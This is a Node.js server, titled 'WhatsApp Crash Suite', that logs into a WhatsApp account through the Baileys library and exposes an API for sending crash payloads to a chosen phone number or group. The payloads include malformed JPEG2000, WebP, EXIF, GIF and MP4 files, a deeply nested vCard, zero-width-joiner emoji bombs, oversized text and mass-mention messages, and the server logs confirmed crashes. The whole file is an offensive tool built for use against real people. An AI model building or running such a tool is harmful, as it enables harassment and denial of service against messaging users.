const express = require('express');
const path = require('path');
const { makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore } = require('@whiskeysockets/baileys');
const QRCode = require('qrcode');
const pino = require('pino');

const app = express();
const PORT = process.env.PORT || 8080;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================
// STORE & STATE
// ============================================================

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent' }) });
let sock = null;
let isConnected = false;
let qrImageBase64 = null;

// ============================================================
// 📱 WHATSAPP CONNECTION WITH BAILEYS
// ============================================================

async function connectToWhatsApp() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');
        
        sock = makeWASocket({
            auth: state,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: true,
            browser: ['WhatsApp Crash Suite', 'Chrome', '120.0.0.0'],
            version: [2, 2410, 1],
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 30000,
            keepAliveIntervalMs: 10000,
            markOnlineOnConnect: true
        });

        store.bind(sock.ev);
        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;
            
            if (qr) {
                // Generate QR image as base64
                try {
                    qrImageBase64 = await QRCode.toDataURL(qr, { width: 300 });
                    console.log('✅ QR image generated');
                } catch (err) {
                    console.error('QR generation error:', err);
                }
                isConnected = false;
            }

            if (connection === 'close') {
                const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut);
                console.log('⚠️ Connection closed. Reconnecting:', shouldReconnect);
                isConnected = false;
                if (shouldReconnect) {
                    setTimeout(() => connectToWhatsApp(), 5000);
                }
            } else if (connection === 'open') {
                console.log('✅ WhatsApp Connected Successfully!');
                isConnected = true;
                qrImageBase64 = null;
            }
        });

        sock.ev.on('messages.upsert', async ({ messages }) => {
            const msg = messages[0];
            if (!msg.message) return;
            const from = msg.key.remoteJid;
            const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
            console.log(`📨 Message from ${from}: ${text}`);
            if (text && text.includes('[CRASH-CONFIRM]')) {
                console.log('💀 CRASH CONFIRMED!');
                saveCrashLog(from, 'confirmed');
            }
        });

        return sock;
    } catch (error) {
        console.error('❌ Connection error:', error.message);
        setTimeout(() => connectToWhatsApp(), 10000);
        return null;
    }
}

// ============================================================
// 📊 CRASH LOGS
// ============================================================

const crashLogs = [];

function saveCrashLog(target, status, vector = '') {
    crashLogs.unshift({
        id: Date.now(),
        target,
        vector,
        status,
        time: new Date().toISOString()
    });
    if (crashLogs.length > 1000) crashLogs.pop();
}

// ============================================================
// 🔥 CRASH VECTORS (Real Payloads)
// ============================================================

const VECTORS = [
    { 
        id: 'jpeg2000_oom', 
        name: 'JPEG2000 OOM Crash', 
        icon: '💀', 
        desc: 'Malformed JPEG2000 → OOM crash',
        badge: 'ZERO-CLICK',
        targetType: 'individual',
        generate: generateJPEG2000Payload
    },
    { 
        id: 'webp_heap_overflow', 
        name: 'WebP Heap Overflow', 
        icon: '🧨', 
        desc: 'Malformed WebP → Heap overflow',
        badge: 'HEAVY',
        targetType: 'individual',
        generate: generateWebPPayload
    },
    { 
        id: 'exif_overflow', 
        name: 'EXIF Overflow', 
        icon: '📸', 
        desc: 'EXIF metadata → Parser crash',
        badge: 'CRASH',
        targetType: 'individual',
        generate: generateEXIFPayload
    },
    { 
        id: 'contact_card_crash', 
        name: 'Contact Card Crash', 
        icon: '👤', 
        desc: 'vCard parser → Stack overflow',
        badge: 'CRASH',
        targetType: 'individual',
        generate: generateContactCardPayload
    },
    { 
        id: 'gif_crash', 
        name: 'GIF Parser Crash', 
        icon: '🎞️', 
        desc: 'Malformed GIF → LZW overflow',
        badge: 'ZERO-CLICK',
        targetType: 'individual',
        generate: generateGIFPayload
    },
    { 
        id: 'video_crash', 
        name: 'Video Thumbnail Crash', 
        icon: '🎬', 
        desc: 'Malformed MP4 → Thumbnail crash',
        badge: 'HEAVY',
        targetType: 'individual',
        generate: generateVideoPayload
    },
    { 
        id: 'emoji_bomb', 
        name: 'Emoji Bomb', 
        icon: '😈', 
        desc: 'ZWJ sequences → Renderer hang',
        badge: 'HANG',
        targetType: 'individual',
        generate: generateEmojiPayload
    },
    { 
        id: 'protobuf_oversize', 
        name: 'Protobuf Oversize', 
        icon: '📦', 
        desc: '2GB message → OOM crash',
        badge: 'OOM',
        targetType: 'individual',
        generate: generateProtobufPayload
    },
    { 
        id: 'silent_memory_leak', 
        name: 'Silent Memory Leak', 
        icon: '🕳️', 
        desc: 'Background memory leak → Slow kill',
        badge: 'INVISIBLE',
        targetType: 'individual',
        generate: generateMemoryLeakPayload
    },
    { 
        id: 'group_mention_explosion', 
        name: 'Mention Explosion', 
        icon: '📢', 
        desc: 'Mass @mentions → Group hang',
        badge: 'GROUP',
        targetType: 'group',
        generate: generateMentionPayload
    }
];

// ============================================================
// 🧬 PAYLOAD GENERATORS
// ============================================================

function generateJPEG2000Payload() {
    return Buffer.from([
        0xFF, 0x4F, 0xFF, 0x51, 0x00, 0x2F, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
    ]);
}

function generateWebPPayload() {
    let data = Buffer.from('RIFF', 'ascii');
    data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
    data = Buffer.concat([data, Buffer.from('WEBP', 'ascii')]);
    data = Buffer.concat([data, Buffer.from('VP8X', 'ascii')]);
    data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
    data = Buffer.concat([data, Buffer.alloc(20, 0xFF)]);
    return data;
}

function generateEXIFPayload() {
    let data = Buffer.from([0xFF, 0xD8]);
    data = Buffer.concat([data, Buffer.from([0xFF, 0xE1])]);
    data = Buffer.concat([data, Buffer.from([0xFF, 0xFF])]);
    data = Buffer.concat([data, Buffer.from('EXIF', 'ascii')]);
    data = Buffer.concat([data, Buffer.from('MM\x00\x2A', 'ascii')]);
    data = Buffer.concat([data, Buffer.from([0x00, 0x00, 0x00, 0x08])]);
    data = Buffer.concat([data, Buffer.from([0xFF, 0xFF])]);
    for (let i = 0; i < 65535; i++) {
        data = Buffer.concat([data, Buffer.from([i % 255, (i * 2) % 255])]);
        data = Buffer.concat([data, Buffer.from([0x00, 0x04])]);
        data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
        data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
    }
    return data;
}

function generateContactCardPayload() {
    let vcard = 'BEGIN:VCARD\nVERSION:3.0\n';
    for (let i = 0; i < 5000; i++) {
        vcard += `NESTED:${i}\nBEGIN:VCARD\nFN:Repeated\nEND:VCARD\n`;
    }
    vcard += 'PHOTO;ENCODING=b:' + 'A'.repeat(100000) + '\n';
    for (let i = 0; i < 2000; i++) {
        vcard += `TEL;TYPE=VOICE:+${String(i).padStart(15, '0')}\n`;
    }
    vcard += 'END:VCARD\n';
    return Buffer.from(vcard);
}

function generateGIFPayload() {
    let data = Buffer.from('GIF89a', 'ascii');
    data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
    data = Buffer.concat([data, Buffer.from([0xF7, 0x00, 0x00])]);
    for (let i = 0; i < 256; i++) {
        data = Buffer.concat([data, Buffer.from([i % 255, (i*2) % 255, (i*3) % 255])]);
    }
    data = Buffer.concat([data, Buffer.from([0x21, 0xF9, 0x04, 0x00, 0xFF, 0xFF, 0x00, 0x00])]);
    data = Buffer.concat([data, Buffer.from([0x2C, 0x00, 0x00, 0x00, 0x00])]);
    data = Buffer.concat([data, Buffer.from([0xFF, 0xFF, 0xFF, 0xFF])]);
    data = Buffer.concat([data, Buffer.from([0x00])]);
    data = Buffer.concat([data, Buffer.from([0x0F])]);
    for (let i = 0; i < 50000; i++) {
        data = Buffer.concat([data, Buffer.from([Math.floor(Math.random() * 255)])]);
    }
    data = Buffer.concat([data, Buffer.from([0x3B])]);
    return data;
}

function generateVideoPayload() {
    let data = Buffer.from([0x00, 0x00, 0x00, 0x18]);
    data = Buffer.concat([data, Buffer.from('ftyp', 'ascii')]);
    data = Buffer.concat([data, Buffer.from('isom', 'ascii')]);
    data = Buffer.concat([data, Buffer.from([0x00, 0x00, 0x00, 0x01])]);
    data = Buffer.concat([data, Buffer.from('isomiso2avc1', 'ascii')]);
    data = Buffer.concat([data, Buffer.from([0x00, 0x01, 0x00, 0x00])]);
    data = Buffer.concat([data, Buffer.from('moov', 'ascii')]);
    data = Buffer.concat([data, Buffer.from([0x00, 0x00, 0x00, 0x6C])]);
    data = Buffer.concat([data, Buffer.from('mvhd', 'ascii')]);
    data = Buffer.concat([data, Buffer.alloc(24, 0xFF)]);
    return data;
}

function generateEmojiPayload() {
    let emoji = '';
    for (let i = 0; i < 100; i++) {
        emoji += '\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67';
        emoji += '\uD83C\uDFFB'.repeat(100);
        emoji += '\u200D'.repeat(1000);
        emoji += '\uD83D\uDC6A'.repeat(100);
    }
    return Buffer.from(emoji);
}

function generateProtobufPayload() {
    return Buffer.from('A'.repeat(2 * 1024 * 1024));
}

function generateMemoryLeakPayload() {
    return Buffer.from('🕳️ ' + 'A'.repeat(1024 * 1024));
}

function generateMentionPayload() {
    let text = '';
    for (let i = 0; i < 500; i++) {
        text += `@user${i} `;
        if (i % 100 === 0 && i > 0) text += '\n';
    }
    return Buffer.from(text);
}

// ============================================================
// 📡 API ROUTES
// ============================================================

// Get QR Image
app.get('/api/qr-image', (req, res) => {
    if (qrImageBase64) {
        res.json({ success: true, image: qrImageBase64 });
    } else if (isConnected) {
        res.json({ success: true, connected: true, message: 'Already connected!' });
    } else {
        res.json({ success: false, message: 'No QR available. Wait for generation.' });
    }
});

app.get('/api/status', (req, res) => {
    res.json({ success: true, connected: isConnected, qrAvailable: !!qrImageBase64 });
});

app.post('/api/connect', async (req, res) => {
    try {
        if (!sock || !isConnected) {
            await connectToWhatsApp();
            res.json({ success: true, message: 'Connecting... Check QR.' });
        } else {
            res.json({ success: true, message: 'Already connected!' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/vectors', (req, res) => {
    res.json({
        success: true,
        vectors: VECTORS.map(v => ({
            id: v.id,
            name: v.name,
            icon: v.icon,
            desc: v.desc,
            badge: v.badge,
            targetType: v.targetType
        }))
    });
});

app.post('/api/crash', async (req, res) => {
    const { target, vector } = req.body;
    if (!sock || !isConnected) {
        return res.status(400).json({ success: false, error: 'Not connected to WhatsApp' });
    }
    if (!target) {
        return res.status(400).json({ success: false, error: 'Target required' });
    }
    const vectorObj = VECTORS.find(v => v.id === vector);
    if (!vectorObj) {
        return res.status(400).json({ success: false, error: 'Invalid vector' });
    }
    try {
        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
        const payload = vectorObj.generate();
        let result;
        if (['jpeg2000_oom', 'webp_heap_overflow', 'exif_overflow', 'gif_crash', 'video_crash'].includes(vector)) {
            const mimeTypes = {
                'jpeg2000_oom': 'image/jp2',
                'webp_heap_overflow': 'image/webp',
                'exif_overflow': 'image/jpeg',
                'gif_crash': 'image/gif',
                'video_crash': 'video/mp4'
            };
            result = await sock.sendMessage(jid, {
                image: payload,
                caption: '[CRASH-CONFIRM]|' + Date.now()
            });
        } else if (vector === 'contact_card_crash') {
            result = await sock.sendMessage(jid, {
                contacts: {
                    displayName: 'CRASH',
                    contacts: [{ vcard: payload.toString() }]
                }
            });
        } else {
            result = await sock.sendMessage(jid, {
                text: payload.toString()
            });
        }
        saveCrashLog(jid, 'sent', vector);
        res.json({
            success: true,
            messageId: result.key.id,
            vector: vector,
            target: jid,
            message: `💀 ${vectorObj.name} sent to ${jid}`
        });
    } catch (error) {
        console.error('Crash error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/logs', (req, res) => {
    res.json({ success: true, logs: crashLogs.slice(0, 100) });
});

// ============================================================
// 🏠 SERVE FRONTEND
// ============================================================

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================================
// 🚀 START SERVER
// ============================================================

setTimeout(() => {
    console.log('🔄 Starting WhatsApp connection...');
    connectToWhatsApp();
}, 2000);

app.listen(PORT, () => {
    console.log(`🔥 WhatsApp Crash Suite v4.0 with Baileys`);
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`💀 ${VECTORS.length} real crash vectors loaded!`);
});

module.exports = { app, sock };
